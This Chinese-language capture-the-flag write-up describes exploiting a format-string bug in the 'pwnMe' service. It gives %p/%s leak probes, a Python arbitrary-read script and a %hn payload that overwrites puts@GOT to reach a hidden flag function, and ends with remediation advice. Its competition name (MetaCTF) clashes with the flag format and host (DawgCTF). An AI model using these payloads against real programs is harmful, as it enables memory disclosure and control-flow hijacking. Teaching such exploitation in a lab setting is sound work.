# MetaCTF - pwnMe Writeup

## 题目信息
- **比赛**: MetaCTF
- **题目**: pwnMe
- **类别**: Pwn
- **难度**: 简单
- **附件/URL**: `nc.umbccd.net:8925`
- **附件链接**: 无本地附件，题面提供源码与远程服务
- **Flag格式**: `DawgCTF{...}`
- **状态**: 已解

## Flag

```text
DawgCTF{s3v3r_PWNed!}
```

## 解题过程

### 1. 初始侦察/服务识别
- 连接远程服务后，首次不会主动输出任何内容；只有发送输入后，服务才会把内容打印出来。
- 先发送普通字符串验证交互：

```text
$ nc nc.umbccd.net 8925
hello
hello

Goodbye!
```

- 这说明程序大致逻辑是“读入一行 -> 打印该行 -> 再打印 `Goodbye!`”。
- 接着发送格式化字符串探针：

```text
%p %p %p %p %p %p %p %p
```

- 远程返回了真实地址和值，而不是字面量 `%p`：

```text
0x7ffff7fac963 0xfbad208b 0x7fffffffe2a0 (nil) (nil) 0x7025207025207025 ...
```

- 这说明服务端存在典型的格式化字符串漏洞，即把用户输入直接交给了 `printf(buf)` 一类函数。

### 2. 利用 `%n$p` / `%n$s` 枚举栈与指针
- 继续用位置参数枚举栈槽位：

```text
%1$p|%2$p|...|%40$p
```

- 可以稳定看到几个关键值：
  - `0x401248` 这样的程序代码段地址，说明程序是 **non-PIE**
  - `0x403df0`、`0x404000` 一带的静态地址，说明 GOT / 数据段地址固定
  - `0x7fffffffe***` 一带的栈地址

- 再用 `%n$s` 去把某些槽位当作指针解引用，可以直接泄露进程参数和环境变量。例如：

```text
%57$s -> ./pwnMe
%59$s -> SHELL=/bin/bash
%60$s -> PWD=/home/dawgctf/chals/med
...
```

- 这一步证明了两点：
  1. 我们不只可以“读栈值”，还可以做**任意地址读**
  2. 程序确实运行在固定路径下，且二进制名为 `pwnMe`

### 3. 任意地址读定位关键字符串与隐藏函数
- 在 64 位 System V ABI 下，前 6 个 `printf` 参数走寄存器；如果我们把地址附加到输入末尾，再用 `%7$s`，就可以把第一个附加的 8 字节当作指针读取。
- 用 Python 构造的最小任意地址读原型如下：

```python
import socket, struct

addr = 0x400000
payload = b'%7$.32sA' + struct.pack('<Q', addr) + b'\n'

s = socket.create_connection(('nc.umbccd.net', 8925))
s.sendall(payload)
print(s.recv(4096).decode('latin1'))
```

- 对 ELF 头 `0x400000` 读取成功后，就可以继续扫 `.rodata`。在 `0x402000` 一带读到了非常关键的字符串：

```text
0x402008 -> flag.txt
0x402018 -> Error opening flag file.
0x402028 -> Flag: %s
```

- 这说明二进制内部并不只是“回显输入”，还额外包含一段**打开 `flag.txt` 并打印 `Flag: %s`** 的隐藏逻辑。
- 接着围绕代码段 `0x401190` 一带继续读指令字节，可以定位出一个隐藏函数入口 `0x401196`。结合题面源码与远程行为，可以确认它就是读取并输出 flag 的函数。

### 4. 利用格式化字符串改写 GOT
- 服务在回显输入后一定会再调用一次：

```c
puts("Goodbye!");
```

- 因此最直接的思路不是 ROP，而是把 `puts@GOT` 改写成隐藏函数 `print_flag` 的地址。这样程序原本打印 `Goodbye!` 的位置，就会自动跳去打印 flag。
- 远程泄露可确认：
  - `puts@GOT = 0x404000`
  - `print_flag = 0x401196`

- 目标地址是：

```text
0x0000000000401196
```

- 由于格式化字符串支持 `%hn`，可以按 2 字节分块写入：
  - `0x404000` <- `0x1196`
  - `0x404002` <- `0x0040`
  - `0x404004` <- `0x0000`
  - `0x404006` <- `0x0000`

- 最终使用的 payload 思路是：

```text
%11$hn%12$hn%1$64c%13$hn%1$4438c%14$hnAA + p64(0x404004) + p64(0x404006) + p64(0x404002) + p64(0x404000)
```

- 这里先把高 4 字节清零，再把低 2 个 halfword 分别写成 `0x0040` 和 `0x1196`。字符数累计精确控制后，`puts@GOT` 就被覆盖为 `0x401196`。

### 5. 获取 Flag
- 发送上面的 payload 后，程序不再调用真正的 `puts`，而是跳进隐藏函数：

```text
Flag: DawgCTF{s3v3r_PWNed!}
```

- 最终 flag 为：

```text
DawgCTF{s3v3r_PWNed!}
```

## 攻击链 / 解题流程总结

```text
连接服务验证普通回显 -> 用 %p 确认 printf 格式化字符串漏洞 -> 用位置参数与 %s 做栈/任意地址读 -> 在 .rodata 中发现 flag.txt 与 "Flag: %s" -> 定位隐藏 print_flag 函数地址 0x401196 -> 用 %hn 分块覆盖 puts@GOT(0x404000) -> 程序执行 puts("Goodbye!") 时跳转到 print_flag -> 输出 flag
```

## 漏洞分析 / 机制分析

### 根因
- 程序把用户可控字符串直接作为格式字符串传给 `printf`，而不是使用 `printf("%s", buf)`。
- 这使攻击者可以：
  - 用 `%p` / `%x` 泄露栈内容
  - 用 `%s` 解引用任意指针
  - 用 `%n` / `%hn` / `%hhn` 向任意地址写入

### 影响
- 在 non-PIE、Partial RELRO 或未完全保护的二进制中，格式化字符串漏洞通常可以直接变成 GOT 覆盖。
- 本题中借助固定地址与后续的 `puts("Goodbye!")` 调用，可以一跳进入隐藏的 flag 函数，不需要额外构造 ROP 链。

### 修复建议
- 永远不要把用户输入直接作为格式字符串传入 `printf` 家族函数。
- 改为：

```c
printf("%s", buf);
```

- 同时启用完整的现代防护：
  - Full RELRO，防止 GOT 被覆盖
  - PIE，增加代码地址随机化
  - 栈保护与 ASLR，降低信息泄露后的利用稳定性

## 知识点
- 格式化字符串漏洞（Format String Vulnerability）
- 位置参数利用（如 `%7$s`、`%11$hn`）
- 任意地址读与 GOT 覆盖
- non-PIE 程序中的静态地址利用

## 使用的工具
- **nc / netcat**: 验证服务交互，快速发送格式化字符串探针
- **Python 3**: 构造任意地址读与最终利用 payload
- **PowerShell**: 在本地做批量枚举与结果整理

## 脚本归档
- Python：待补
- 说明：本题最终利用是一个很短的 Python socket + `struct.pack` 脚本，核心逻辑已在正文中给出

## 命令行提取关键数据（无 GUI）

```bash
# 1. 普通回显验证
echo hello | nc nc.umbccd.net 8925

# 2. 格式化字符串探针
echo "%p %p %p %p %p %p %p %p" | nc nc.umbccd.net 8925

# 3. 枚举位置参数
echo "%1\$p|%2\$p|%3\$p|%4\$p|%5\$p|%6\$p|%7\$p|%8\$p" | nc nc.umbccd.net 8925

# 4. 发送最终 payload（建议用 Python 生成）
python exploit.py
```
